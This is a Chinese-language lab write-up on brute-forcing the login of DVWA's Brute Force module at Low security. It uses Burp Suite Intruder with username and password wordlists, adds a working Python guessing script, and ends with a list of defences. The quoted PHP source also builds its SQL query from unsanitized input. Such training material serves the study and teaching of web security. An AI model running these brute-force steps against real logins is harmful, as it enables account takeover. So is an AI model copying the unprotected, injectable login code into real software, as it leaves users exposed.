# DVWA Brute Force (Low) + Burp Suite Intruder 爆破 WriteUp

## 一、漏洞概述

**暴力破解（Brute Force）** 是指攻击者通过枚举大量用户名和密码组合，尝试登录目标系统。如果应用没有登录失败次数限制、验证码、账户锁定等防护措施，攻击者就可以利用自动化工具快速猜测出有效凭证。

DVWA 的 **Brute Force** 模块模拟了一个简单的登录表单。Low 级别没有任何防护，可以直接使用 Burp Suite 的 **Intruder** 模块进行爆破。

将 DVWA 安全级别设置为 **Low**，进入 **Brute Force** 模块。

---

## 二、源码分析

查看 Low 级别源码：

```php
<?php
if (isset($_GET['Login'])) {
    $user = $_GET['username'];
    $pass = $_GET['password'];
    $pass = md5($pass);

    $query = "SELECT * FROM users WHERE user = '$user' AND password = '$pass';";
    $result = mysqli_query($connection, $query);
    $row = mysqli_fetch_assoc($result);

    if ($row) {
        echo "<p>Welcome to the password protected area {$user}</p>";
    } else {
        echo "<p>Username and/or password incorrect.</p>";
    }
}
?>
```

关键点：

1. 登录请求通过 **GET** 方式提交，参数为 `username`、`password` 和 `Login`。
2. 密码使用 MD5 哈希后与数据库比对。
3. **没有登录失败次数限制**。
4. **没有验证码**。
5. **没有账户锁定机制**。
6. 只要用户名和密码匹配，就返回欢迎信息。

因此，攻击者可以无限次尝试不同的用户名和密码组合，直到成功登录。

---

## 三、手工测试

在登录框输入任意用户名和密码，例如：

- 用户名：`admin`
- 密码：`123456`

点击 Login，页面返回：

```text
Username and/or password incorrect.
```

再尝试其他组合，均返回相同提示。说明登录失败时页面没有额外信息泄露，但也没有任何防护。

---

## 四、Burp Suite Intruder 爆破

### 1. 配置代理并抓取登录请求

1. 打开 Burp Suite，确保代理监听在 `127.0.0.1:8080`。
2. 浏览器设置代理为 `127.0.0.1:8080`。
3. 在 DVWA Brute Force 页面输入任意用户名和密码（例如 `admin` / `123456`），点击 Login。
4. 在 Burp 的 **Proxy -> HTTP history** 中找到该请求，右键选择 **Send to Intruder**。

请求示例如下：

```http
GET /dvwa/vulnerabilities/brute/?username=admin&password=123456&Login=Login HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=...; security=low
User-Agent: Mozilla/5.0 ...
Accept: text/html,...
Connection: close
```

### 2. 设置攻击类型

进入 **Intruder -> Positions** 标签页。

- 点击 **Clear §** 清除所有自动标记的位置。
- 选中 `username` 的值（例如 `admin`），点击 **Add §**。
- 选中 `password` 的值（例如 `123456`），点击 **Add §**。

最终请求模板应类似：

```http
GET /dvwa/vulnerabilities/brute/?username=§admin§&password=§123456§&Login=Login HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=...; security=low
...
```

攻击类型选择 **Cluster bomb**，因为需要同时枚举用户名和密码。

### 3. 准备字典

**用户名字典**（`users.txt`）：

```text
admin
gordonb
1337
pablo
smithy
```

**密码字典**（`passwords.txt`）：

```text
password
123456
12345678
qwerty
abc123
letmein
admin
welcome
monkey
dragon
```

> DVWA 默认用户为 `admin`、`gordonb`、`1337`、`pablo`、`smithy`，默认密码可以在数据库初始化时设置。常见默认密码为 `password`。

### 4. 配置 Payload

进入 **Intruder -> Payloads** 标签页。

- **Payload set 1**：选择用户名对应的位置，Payload type 选择 **Simple list**，加载 `users.txt`。
- **Payload set 2**：选择密码对应的位置，Payload type 选择 **Simple list**，加载 `passwords.txt`。

### 5. 开始攻击

点击右上角 **Start attack** 按钮。

Burp 会依次组合用户名和密码，发送大量请求。攻击过程中可以查看：

- **Status code**：通常都是 `200`。
- **Length**：响应长度。成功登录的响应长度通常与失败不同。
- **Word count**：词数，也可作为判断依据。

### 6. 分析结果

在攻击结果中，按 **Length** 排序。失败的响应长度基本一致，成功的响应会明显不同。

例如：

| Username | Password | Status | Length |
| ---------- | ---------- | -------- | -------- |
| admin    | 123456   | 200    | 4523   |
| admin    | password | 200    | 4601   |
| gordonb  | password | 200    | 4523   |
| ...      | ...      | ...    | ...    |

找到 Length 与其他不同的那一行，对应的就是正确的用户名和密码。

在本例中，正确的凭证通常是：

```text
admin / password
```

### 7. 验证登录

用找到的凭证在浏览器中登录 DVWA，成功进入受保护区域，说明爆破成功。

---

## 五、Python 脚本自动化（可选）

除了 Burp Intruder，也可以用 Python 脚本进行爆破：

```python
import requests

TARGET = "http://127.0.0.1/dvwa/vulnerabilities/brute/"
COOKIES = {
    "PHPSESSID": "你的会话ID",
    "security": "low"
}

users = ["admin", "gordonb", "1337", "pablo", "smithy"]
passwords = ["password", "123456", "12345678", "qwerty", "abc123", "letmein"]

for user in users:
    for pwd in passwords:
        params = {"username": user, "password": pwd, "Login": "Login"}
        r = requests.get(TARGET, params=params, cookies=COOKIES)
        if "Welcome to the password protected area" in r.text:
            print(f"[+] 找到有效凭证: {user} / {pwd}")
            exit()
print("[-] 未找到有效凭证")
```

---

## 六、漏洞成因与防御

**成因**：

1. 没有登录失败次数限制。
2. 没有验证码。
3. 没有账户锁定机制。
4. 密码强度不足，容易猜测。
5. 登录请求使用 GET，便于自动化工具重放。

**防御措施**：

1. **限制登录尝试次数**  
   例如：同一账户连续失败 5 次后锁定 15 分钟，或要求输入验证码。
2. **加入验证码（CAPTCHA）**  
   在登录表单中加入图形验证码或行为验证码，防止自动化爆破。
3. **账户锁定与延迟**  
   多次失败后增加响应延迟，或临时锁定账户。
4. **使用强密码策略**  
   要求密码包含大小写字母、数字和特殊字符，并达到一定长度。
5. **多因素认证（MFA）**  
   即使密码被猜中，攻击者仍需第二因素才能登录。
6. **记录与监控**  
   记录登录失败日志，对异常频率的尝试进行告警和封禁。
7. **敏感操作使用 POST**  
   登录等敏感操作应使用 POST，避免通过 URL 直接触发。

---

## 七、总结

- DVWA Brute Force Low 没有任何防护，可以直接用 Burp Suite Intruder 进行爆破。
- 使用 **Cluster bomb** 攻击类型同时枚举用户名和密码。
- 通过响应长度差异判断成功登录。
- 正确的凭证通常是 `admin / password`。
- 防御暴力破解的核心是：限制尝试次数、加入验证码、账户锁定、强密码策略和多因素认证。

> 本文仅用于 DVWA 靶场学习与授权测试，请遵守法律法规。